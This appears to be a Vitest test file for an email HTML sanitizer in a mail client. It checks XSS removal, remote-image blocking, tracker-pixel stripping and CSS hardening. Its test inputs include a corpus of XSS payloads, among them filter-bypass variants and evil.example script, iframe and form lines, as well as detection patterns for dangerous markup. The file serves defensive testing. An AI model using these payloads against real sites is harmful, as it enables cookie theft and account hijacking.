import { describe, expect, it } from "vitest";
import { PLACEHOLDER_GIF, sanitizeForDisplay } from "./index";

const clean = (html: string, over: Partial<Parameters<typeof sanitizeForDisplay>[1]> = {}) =>
  sanitizeForDisplay(html, { allowRemoteImages: false, receiptsHost: "receipts.flint.example", ...over });

/** Output must never contain anything a browser would execute or fetch behind the user's back. */
function assertInert(html: string): void {
  const lower = html.toLowerCase();
  expect(lower).not.toMatch(/<\s*(script|iframe|frame|frameset|object|embed|applet|form|input|button|textarea|select|base|meta|link|svg|math|audio|video|source|template|noscript)\b/);
  const withoutValues = lower.replace(/="[^"]*"|='[^']*'/g, '=""');
  expect(withoutValues).not.toMatch(/\son[a-z]+\s*=/);
  expect(lower).not.toMatch(/javascript\s*:|vbscript\s*:|livescript\s*:/);
  expect(lower).not.toMatch(/expression\s*\(|-moz-binding|behavior\s*:/);
  expect(lower).not.toMatch(/position\s*:\s*(fixed|sticky)/);
  expect(lower).not.toMatch(/@import/);
  expect(lower).not.toMatch(/\ssrcdoc\s*=/);
}

const XSS: [string, string][] = [
  ["script tag", `<script>alert(1)</script><p>hi</p>`],
  ["script src", `<script src="https://evil.example/x.js"></script>ok`],
  ["uppercase script", `<SCRIPT>alert(1)</SCRIPT>`],
  ["split script", `<scr<script>ipt>alert(1)</scr</script>ipt>`],
  ["img onerror", `<img src=x onerror=alert(1)>`],
  ["img onerror quoted", `<img src="x" onerror="alert(document.cookie)">`],
  ["svg onload", `<svg onload=alert(1)><circle/></svg>`],
  ["svg script", `<svg><script>alert(1)</script></svg>`],
  ["math", `<math><mi xlink:href="javascript:alert(1)">x</mi></math>`],
  ["body onload", `<body onload=alert(1)>text</body>`],
  ["div onmouseover", `<div onmouseover="alert(1)">hover</div>`],
  ["a javascript", `<a href="javascript:alert(1)">click</a>`],
  ["a javascript spaces", `<a href=" jav&#x09;ascript:alert(1)">click</a>`],
  ["a javascript entity", `<a href="&#106;avascript:alert(1)">click</a>`],
  ["a javascript newline", `<a href="java\nscript:alert(1)">click</a>`],
  ["a vbscript", `<a href="vbscript:msgbox(1)">click</a>`],
  ["a data html", `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">click</a>`],
  ["iframe", `<iframe src="https://evil.example"></iframe>`],
  ["iframe srcdoc", `<iframe srcdoc="<script>alert(1)</script>"></iframe>`],
  ["object", `<object data="x.swf"><embed src="x.swf"></object>`],
  ["embed", `<embed src="javascript:alert(1)">`],
  ["form", `<form action="https://evil.example"><input name=p type=password><button>Go</button></form>`],
  ["meta refresh", `<meta http-equiv="refresh" content="0;url=https://evil.example">x`],
  ["base", `<base href="https://evil.example/"><a href="/x">x</a>`],
  ["link stylesheet", `<link rel="stylesheet" href="https://evil.example/x.css">x`],
  ["style import", `<style>@import url(https://evil.example/x.css); p{color:red}</style><p>x</p>`],
  ["style expression", `<p style="width:expression(alert(1))">x</p>`],
  ["style behavior", `<p style="behavior:url(x.htc)">x</p>`],
  ["style moz-binding", `<p style="-moz-binding:url(x.xml#a)">x</p>`],
  ["style js url", `<p style="background:url(javascript:alert(1))">x</p>`],
  ["style fixed", `<div style="position:fixed;top:0;left:0;width:100%;height:100%">overlay</div>`],
  ["style fixed escaped", `<div style="p\\6fsition:fixed">overlay</div>`],
  ["style fixed spaced", `<div style="position : fixed">overlay</div>`],
  ["style sticky", `<div style="position:sticky;top:0">x</div>`],
  ["style block fixed", `<style>.x{position:fixed;top:0}</style><div class="x">x</div>`],
  ["style tag break out", `<style>p{color:red}</style><script>alert(1)</script>`],
  ["style comment trick", `<style>p{width:exp/**/ression(alert(1))}</style>x`],
  ["nested noscript", `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`],
  ["textarea", `<textarea><script>alert(1)</script></textarea>`],
  ["title break", `<title></title><img src=x onerror=alert(1)>`],
  ["xmp", `<xmp><script>alert(1)</script></xmp>`],
  ["template", `<template><script>alert(1)</script></template>`],
  ["img srcset", `<img srcset="https://evil.example/a.png 1x" src="https://evil.example/a.png">`],
  ["background attr", `<table background="javascript:alert(1)"><tr><td>x</td></tr></table>`],
  ["null byte", `<scr\u0000ipt>alert(1)</scr\u0000ipt>`],
  ["video poster", `<video poster="javascript:alert(1)" src="x.mp4" onerror="alert(1)"></video>`],
  ["audio", `<audio src=x onerror=alert(1)></audio>`],
  ["comment", `<!--><script>alert(1)</script>-->`],
  ["cdata", `<![CDATA[><script>alert(1)</script>]]>`],
  ["attr break", `<a href="https://ok.example" title='x" onclick="alert(1)'>x</a>`],
  ["unquoted attr", `<a href=https://ok.example onclick=alert(1)>x</a>`],
  ["data svg img", `<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">`],
  ["data html img", `<img src="data:text/html,<script>alert(1)</script>">`],
  ["xlink", `<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>`],
  ["dangling markup", `<img src='https://evil.example/?`],
];

describe("sanitizeForDisplay: XSS corpus", () => {
  it.each(XSS)("%s", (_name, payload) => {
    const out = clean(payload, { allowRemoteImages: true });
    assertInert(out.html);
    const blocked = clean(payload);
    assertInert(blocked.html);
  });

  it("is idempotent on its own output", () => {
    const once = clean(`<p style="color:red">Hi <a href="https://ok.example">link</a></p><script>x</script>`).html;
    expect(clean(once).html).toBe(once);
  });

  it("never loads a remote resource while remote images are blocked", () => {
    const out = clean(`<img src="https://cdn.example/a.png"><div style="background:url(https://cdn.example/b.png)">x</div><table background="https://cdn.example/c.png"><tr><td>y</td></tr></table><style>.a{background-image:url(//cdn.example/d.png)}</style>`).html;
    expect(out).not.toMatch(/cdn\.example/);
  });
});

describe("sanitizeForDisplay: what stays", () => {
  it("keeps formatting, tables and inline styles", () => {
    const html = `<table width="600" cellpadding="0" style="background:#fff"><tr><td style="color:#333;font-size:14px" align="center"><b>Hello</b> <i>there</i></td></tr></table>`;
    const out = clean(html).html;
    expect(out).toContain("<table");
    expect(out).toContain("font-size:14px");
    expect(out).toContain('align="center"');
    expect(out).toContain("<b>Hello</b>");
  });

  it("keeps style blocks needed by newsletters", () => {
    const out = clean(`<style>.btn{background:#4c8dff;color:#fff;padding:8px}@media (max-width:600px){.btn{padding:4px}}</style><a class="btn" href="https://ok.example">Go</a>`).html;
    expect(out).toContain(".btn{background:#4c8dff");
    expect(out).toContain("@media (max-width:600px)");
  });

  it("opens links in a new tab with noopener and drops unsafe schemes", () => {
    const out = clean(`<a href="https://ok.example/x">a</a><a href="mailto:me@example.com">m</a><a href="tel:+15551234">t</a><a href="#top">h</a><a href="javascript:void(0)">j</a>`).html;
    expect(out).toMatch(/<a href="https:\/\/ok\.example\/x" target="_blank" rel="noopener noreferrer">a<\/a>/);
    expect(out).toContain('href="mailto:me@example.com"');
    expect(out).toContain('href="tel:+15551234"');
    expect(out).toContain('<a href="#top">h</a>');
    expect(out).not.toMatch(/javascript/);
  });

  it("allows data:image sources and rejects other data: images", () => {
    const png = "data:image/png;base64,iVBORw0KGgo=";
    expect(clean(`<img src="${png}" alt="x">`).html).toContain(png);
    expect(clean(`<img src="data:image/svg+xml;base64,AAAA">`).html).not.toContain("<img");
  });

  it("returns a body fragment and turns body attributes into a wrapper", () => {
    const out = clean(`<html><head><title>T</title></head><body style="background:#eee"><p>x</p></body></html>`).html;
    expect(out).not.toMatch(/<(html|head|body|title)/i);
    expect(out).toContain("background:#eee");
  });
});

describe("sanitizeForDisplay: images", () => {
  it("replaces remote images with a placeholder that keeps the size when blocked", () => {
    const r = clean(`<img src="https://cdn.example/hero.jpg" width="600" height="200" alt="Hero">`);
    expect(r.html).toContain(PLACEHOLDER_GIF);
    expect(r.html).toContain('width="600"');
    expect(r.html).toContain('height="200"');
    expect(r.html).not.toContain("cdn.example");
    expect(r.hasRemoteImages).toBe(true);
    expect(r.hasTrackers).toBe(false);
  });

  it("loads remote images when allowed", () => {
    const r = clean(`<img src="https://cdn.example/hero.jpg" width="600">`, { allowRemoteImages: true });
    expect(r.html).toContain("https://cdn.example/hero.jpg");
    expect(r.hasRemoteImages).toBe(true);
  });

  it("upgrades protocol-relative image URLs to https", () => {
    expect(clean(`<img src="//cdn.example/a.png">`, { allowRemoteImages: true }).html).toContain("https://cdn.example/a.png");
  });

  it("resolves cid images through the resolver and falls back to the placeholder", () => {
    const html = `<img src="cid:logo@x"><img src="cid:missing">`;
    const r = clean(html, { cidResolver: (cid) => (cid === "logo@x" ? "flint-attachment://42" : null) });
    expect(r.html).toContain("flint-attachment://42");
    expect(r.html).toContain(PLACEHOLDER_GIF);
  });

  it("handles cid with angle brackets", () => {
    const r = clean(`<img src="cid:<logo@x>">`, { cidResolver: (cid) => (cid === "logo@x" ? "flint-attachment://1" : null) });
    expect(r.html).toContain("flint-attachment://1");
  });
});

describe("sanitizeForDisplay: trackers", () => {
  const trackers = [
    "https://mailtrack.io/trace/mail/abc.png",
    "https://pixel.mailtrack.io/x.gif",
    "https://t.hubspotemail.net/e2t/o/abc",
    "https://u123.ct.sendgrid.net/wf/open?upn=abc",
    "https://us1.list-manage.com/track/open.php?u=1&id=2",
    "https://mandrillapp.com/track/open.php?u=1",
    "https://r.superhuman.com/abc.gif",
    "https://app.yesware.com/trk/abc",
    "https://track.mixmax.com/api/track/abc",
    "https://bl.bananatag.com/x.gif",
    "https://email.getnotify.com/x.gif",
    "https://sendibt2.com/abc",
    "https://a.klaviyomail.com/open/abc",
    "https://link.apollo.io/e/o/abc",
    "https://app.lemlist.com/api/opened/abc",
    "https://sdr.salesloft.com/x",
    "https://t.streak.com/x.gif",
    "https://cirrusinsight.com/x.gif",
    "https://r20.rs6.net/on.jsp?t=1",
    "https://trk.customeriomail.com/e/o/abc",
  ];
  it.each(trackers)("removes %s", (url) => {
    const r = clean(`<p>Hi</p><img src="${url}" width="1" height="1">`, { allowRemoteImages: true });
    expect(r.html).not.toContain("<img");
    expect(r.hasTrackers).toBe(true);
  });

  it("removes a known tracker even when it is not 1x1", () => {
    const r = clean(`<img src="https://mailtrack.io/trace/mail/abc.png" width="120" height="40">`, { allowRemoteImages: true });
    expect(r.html).not.toContain("<img");
    expect(r.hasTrackers).toBe(true);
  });

  it("removes tiny or hidden images with pixel-looking URLs on unknown hosts", () => {
    const r = clean(`<img src="https://news.example.org/open/abc.gif" width="1" height="1"><img src="https://news.example.org/pixel?id=3" style="display:none">`, { allowRemoteImages: true });
    expect(r.html).not.toContain("<img");
    expect(r.hasTrackers).toBe(true);
  });

  it("keeps ordinary images from hosts that also run trackers", () => {
    const r = clean(`<img src="https://us1.list-manage.com/images/logo.png" width="200" height="50">`, { allowRemoteImages: true });
    expect(r.html).toContain("list-manage.com/images/logo.png");
    expect(r.hasTrackers).toBe(false);
  });

  it("does not drop a content image for being small when the URL does not look like a pixel", () => {
    const r = clean(`<img src="https://cdn.example/icons/dot.png" width="1" height="1">`, { allowRemoteImages: true });
    expect(r.html).toContain("dot.png");
  });

  it("always removes the user's own receipts pixel, even with trackers allowed", () => {
    const html = `<img src="https://receipts.flint.example/i/abc123.gif" width="1" height="1" style="opacity:0"><p>Mine</p>`;
    for (const opts of [{ allowRemoteImages: true }, { allowRemoteImages: false }, { allowRemoteImages: true, blockTrackers: false }]) {
      const r = clean(html, opts);
      expect(r.html).not.toContain("receipts.flint.example");
      expect(r.html).not.toContain("<img");
    }
  });

  it("recognizes the receipts host given as a URL and for subdomains", () => {
    const r = clean(`<img src="https://eu.receipts.flint.example/i/x.gif">`, { allowRemoteImages: true, receiptsHost: "https://receipts.flint.example" });
    expect(r.html).not.toContain("<img");
  });

  it("keeps trackers when tracker blocking is off", () => {
    const r = clean(`<img src="https://mailtrack.io/trace/abc.png" width="1" height="1">`, { allowRemoteImages: true, blockTrackers: false });
    expect(r.html).toContain("mailtrack.io");
    expect(r.hasTrackers).toBe(false);
  });

  it("removes trackers while images are blocked too", () => {
    const r = clean(`<img src="https://mailtrack.io/trace/abc.png" width="1" height="1">`);
    expect(r.html).not.toContain("<img");
    expect(r.hasTrackers).toBe(true);
  });

  it("strips tracker backgrounds", () => {
    const r = clean(`<table background="https://mailtrack.io/x.png"><tr><td>x</td></tr></table>`, { allowRemoteImages: true });
    expect(r.html).not.toContain("mailtrack");
  });
});

describe("sanitizeForDisplay: CSS remote urls", () => {
  it("allows remote css urls only when remote images are allowed", () => {
    const html = `<div style="background-image:url(https://cdn.example/bg.png)">x</div>`;
    expect(clean(html, { allowRemoteImages: true }).html).toContain("cdn.example/bg.png");
    const blocked = clean(html);
    expect(blocked.html).not.toContain("cdn.example");
    expect(blocked.hasRemoteImages).toBe(true);
  });
});

describe("css hardening", () => {
  it("handles unclosed url( floods in linear time", () => {
    const style = "background:" + "url(//a/".repeat(60000);
    const t = Date.now();
    const r = sanitizeForDisplay(`<div style="${style}">x</div>`, { allowRemoteImages: false });
    expect(Date.now() - t).toBeLessThan(1500);
    expect(r.html).not.toContain("url(//a/");
    const t2 = Date.now();
    sanitizeForDisplay(`<style>a{x:${"/*a".repeat(100000)}</style>`, { allowRemoteImages: false });
    expect(Date.now() - t2).toBeLessThan(1500);
  });
  it("renders oversized html as plain text", () => {
    const r = sanitizeForDisplay("<p>hi</p>" + "x".repeat(4 * 1024 * 1024), { allowRemoteImages: false });
    expect(r.html.startsWith("<pre")).toBe(true);
  });
  it("catches escaped url( and image-set", () => {
    for (const css of ["background:\\75rl(https://evil/a.png)", "background:u\\72l(https://evil/a.png)", "background:url(\\68ttps://evil/a.png)", "background:image-set('https://evil/a.png' 1x)"]) {
      const r = sanitizeForDisplay(`<div style="${css}">x</div>`, { allowRemoteImages: false });
      expect(r.html).not.toContain("evil");
      expect(r.hasRemoteImages).toBe(true);
    }
  });
});
